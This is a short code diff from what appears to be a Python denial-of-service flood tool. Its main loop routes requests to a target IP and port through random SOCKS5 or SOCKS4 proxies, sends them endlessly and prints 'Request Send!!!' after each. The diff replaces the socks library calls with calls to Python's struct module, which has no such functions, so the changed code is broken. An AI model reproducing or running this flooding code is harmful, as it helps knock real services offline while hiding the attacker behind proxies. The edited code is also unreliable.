@@ -178,8 +178,8 @@ def run():
     proxy = random.choice(proxies).strip().split(":")
     while True:
         try:
-            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-            s = socks.socksocket()
+            struct.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+            s = struct.socksocket()
             s.connect((str(ip), int(port)))
             s.send(str.encode(request))
             print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!")
@@ -191,7 +191,7 @@ def run():
         except:
             s.close()
             try:
-                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+                struct.setdefaultproxy(struct.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
                 s.connect((str(ip), int(port)))
                 s.send(str.encode(request))
                 print (str(proxy[0]+":"+proxy[1])+"<>---------<>Request Send!!!\r\n")
